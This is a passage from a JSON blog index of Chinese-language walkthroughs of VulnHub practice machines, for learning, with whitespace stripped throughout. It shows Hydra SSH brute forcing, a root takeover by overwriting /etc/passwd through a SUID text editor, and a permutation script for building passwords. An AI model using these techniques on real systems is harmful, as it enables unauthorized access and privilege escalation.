名的进程是/bin/ash，想到bashshell会有历史纪录，赶紧重新上传一个poc验证想法。回显内容：\"./ash.history\"获取~Useradd–Dbossdonttrackme–psuperultrapass3根据所得的内容生成用户字典（passwd回显的用户名），密码字典。用Hydra跑一下。##hydra-L/root/Documents/test/minu/use.txt-P/root/Documents/test/minu/passwd.txtssh://$_ipHydrav8.9.1(c)2019byvanHauser/THC-Pleasedonotuseinmilitaryorsecretserviceorganizations,orforillegalpurposes.[WARNING]ManySSHconfigurationslimitthenumberofparalleltasks,itisrecommendedtoreducethetasks:use-t4\t[DATA]max16tasksper1server,overall16tasks,30logintries(l:30/p:1),~2triespertask[DATA]attackingssh://$_ip:22/[22][ssh]host:$_ip**login:employeepassword:superultrapass3**1of1targetsuccessfullycompleted,1validpasswordfound##跑出来账号密码employee：uperultrapass3，ssh连上去。##连接上去查看一下基本信息sshemployee@ipwhoamiid|find-perm-40002&gt;/dev/null五、提权发现micro和bbsuid不需要高权限，运行一下，发现micro是一个文本编辑工具器。接下来就简单了。#生成一份hash值，替换掉passwd的用户密码，这样密码就已知了。#用micro编辑器打开passwd文件，替换root密码保存即可passwd-1-saltyrootadmin123(随意)cat/etc/passwd|/usr/bin/micro这样我们就已知root密码了，直接切换用户minuv2:~$surootPassword:minuv2:/home/employee#whoamirootminuv2:/home/employee#获得flag~感谢各位"
  },

  {
    "title"    : "「渗透」:PumpkinRaising-密码学的奥义",
    "category" : "",
    "tags"     : "Web, 漏洞复现, 渗透, vulnhub",
    "url"      : "/blog/2019/PumpkinRaising-walkthrough/",
    "date"     : "Jul 15, 2019",
    "content"  : "序言hello,各位看官。最近忙里偷闲花了两天时间测试入侵了一个linux靶机，遂记录下。这个靶机我觉得挺适合刚入门的有一些基础的白帽子，对就是你！，大部分flag都是利用一些工具来获得。大佬看客笑看便是（手动狗头）。整篇记录的都是小弟的思路，看官们跟着小弟的思路看就是了，会有些乱。见笑。一、靶机靶机来自vulnhub，下载地址如下：PumpkinRaising:Download(Mirror):https://download.vulnhub.com/missionpumpkin/PumpkinRaising.ovaDownload(Torrent):https://download.vulnhub.com/missionpumpkin/PumpkinRaising.ova.torrent二、实战2.1端口扫描江湖规矩，神器开路：首先先用Nmap扫描确定靶机地址。发现开放的靶机ip。扫描一波（-O-A狗头）：咱们发现没有多余的端口开放，中规中矩，22,80端口。附带扫出80端口下的robots.txt。小弟一个激灵，这么多？心里美滋滋一个一个打开看，不急，这次怕是十拿九稳（狗头）。22端口先不管他，小弟看到这么多内容的robots文件夹，如获至宝赶紧打开，我的乖，目录图片文件路径，先看看文件选项有没有什么线索。2.2端口“踩点”——顺藤摸瓜小弟试下来后发现文件只有如下能够访问：1）underconstruction.html：（页面名意还在建设的页面）提示我们说图片下面有猫腻。咱们先把这个uc.gif图片下载下来试试水。正好小弟最近在研究图片隐写，丢到Stegsolve查看一波。跟普通图片差不多AlphaP1-7都是空白翻了又翻觉得RedP6、7有点异常，打开数据抽取查看源码没有收获（原谅小弟，小弟是noob~）；尝试了GRB各种组合，各种低0位，也尝试了提取bin都未提取出有用的信息。忽然想到这个图片是gif，会不会有偏移呢？赶紧StereogramSlover尝试偏移，不出所料也失败了，就这样在这张图片上浪费了不少时间。既然找不到有用的信息，那么这张图片先放一放。。不急，先往后面看。继续通过robots文件的内容查看。2）hidden目录的note文本hidden目录下的note文本文件，显示了一些貌似账号密码的文本，难道是ssh的账号信息？不会这么简单吧，虽然嘴上说着不会，身体却很诚实去试了试，不行。。但是我们到现在还没有发现类似登陆页面的东西，也先放一放。3）/seeds/seed.txt.gpg访问后直接下载下来了，gpg？下载下来打开乱码，谷歌一哈搜到几个工具，我这里用的是kali的gpg（没用过可以自行百度有教程安装，几百K）花了点时间摸索了一下发现了线索看着像摩斯密码，丢到摩斯解密工具里解密，就这样小弟居然得到了第一个flag（id）：695072.3言归正传——80端口咱们再来看看主页有些啥。80端口下静态页面~查看源码，得到两个有用的信息：一段看上去像base64的密文，赶紧丢到解密工具解密，没有什么有用的信息：Thisisjusttoremaindyouthatit'sLevel2ofMission-Pumpkin!;)继续，一个url，转向pumpkin.html又是一串注释掉的密文字符串，丢base64解不出，试试base32解。解密为：/scripts/spy.pacp，访问一哈，下载下来一个tcp包文件，wireshark打开，随意点一个带有push字的包发现明文传输，毫不犹豫追踪TCP流，发现ID：50609~lucky，不错哟重点来了：别忘了上面pumpkin.html右边的滑块，拉到底发现被注释掉的十六进制的数组，用网站工具解密，找到SeedsID:96454（本人习惯比较差，不喜欢f12，所以这个点真的后知后觉才发现，小声bb）终于功夫不负有心人，已经解出三个id，根据作者靶机下载页面的提示一共有四个id。总结一下，还有一张gif图片藏着一个id，解密出来再加上已经解密出的三个id，就大功告成了。（这么自信？）既然Stegsolve试了不行咱们就换一个，使用stegosuite解密，试了一下需要密码，忽然想到之前hidden目录下奇怪的字符，赶紧复制下来一个一个试，还是不行，提示密码错误。难受~难道是图片错了？果然，在小弟的坚持不懈的努力下，发现了猫腻。猫腻不在于图片下的隐写，而在于哪张图片。。。最后隐写图片是那张jackolatantern.gif。（靶机作者已经被我吐槽一万遍）提取文本，得到id：865682.4id已齐，LetsGo就这样，一共找到四个seedsid：69507964545060986568接着小弟看着这个四个id，猜测用户名jack并且陷入了深深的沉思，到底是用msf跑呢，还是海德拉~没错小弟就是这么纠结--(脚本是python的内建函数写的文尾附上)三、组合拳——ssh,提权最后还是用了最爱的msf跑出来密码（先用脚本组合四个id的不同组合即可），如图跑出来了。下一步ssh连吧。ssh-ljackpass继续行云流水，sudosu。不行？最后参考资料提到权限。省去exp提权~四、总结总结下来，此次这个靶机的入侵过程虽然有些曲折，本菜也被误导到不少坑里~但是总体来说都不是很难，没有让我们来挖洞找页面漏洞来弹webshell，所以小弟认为比较适合一些有渗透基础的玩家~（对，就是我没错）。参考资料https://www.360zhijia.com/anquan/413205.html随机组合脚本:#a,b,c,d代替即可，别忘了python严格的缩进~importitertools\tforiinitertools.permutations([a,b,c,d],4):\tprint(i)havefun！guys.whynotdoityourself?"
  }

]